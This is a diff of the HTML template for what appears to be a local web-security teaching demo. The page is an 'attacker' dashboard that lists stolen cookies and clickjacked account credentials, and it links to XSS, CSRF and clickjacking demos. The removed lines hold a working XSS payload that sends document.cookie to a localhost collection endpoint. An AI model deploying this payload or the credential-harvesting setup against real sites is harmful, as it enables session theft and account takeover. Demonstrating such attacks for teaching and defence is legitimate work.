@@ -20,18 +20,21 @@
     </style>
 </head>
 <body>
-<h1>渗透测试攻击者-成果展示</h1>
-<p>1. 我们引入以下 xss 攻击，获取的用户的 cookie 信息：</p>
-<p>
-    <code>&lt;img src=null onerror=&quot;document.createElement(&#x27;img&#x27;).src=[&#x27;http://localhost:9001/add?a=&#x27;,encodeURIComponent(document.cookie)].join(&#x27;&#x27;)&quot;/&gt;   </code>
-</p>
+<h1>渗透测试攻击者</h1>
+<h2>攻击方式说明：</h2>
+<ul>
+    <li><a href="/static/xssFromFrontend.html">xss 攻击</a></li>
+    <li><a href="/static/csrf.html">csrf 攻击</a></li>
+    <li><a href="/static/clickjacking.html">点击劫持</a></li>
+</ul>
+<h2>成果展示：</h2>
+<p>1. 我们引入 xss 攻击，获取的用户的 cookie 信息：</p>
 <ul>
     <% for (let i = 0; i < localhost9001Cookies.length; i ++) { %>
     <li><%= localhost9001Cookies[i] %></li>
     <% } %>
 </ul>
-<p>2. 我们引入诱导用户使用该页面，进行点击劫持，获取到的账号密码：</p>
-<p><code>http://localhost:9001/clickjacking</code></p>
+<p>2. 我们进行点击劫持，获取到的账号密码：</p>
 <table>
     <tr>
         <th>账号</th>
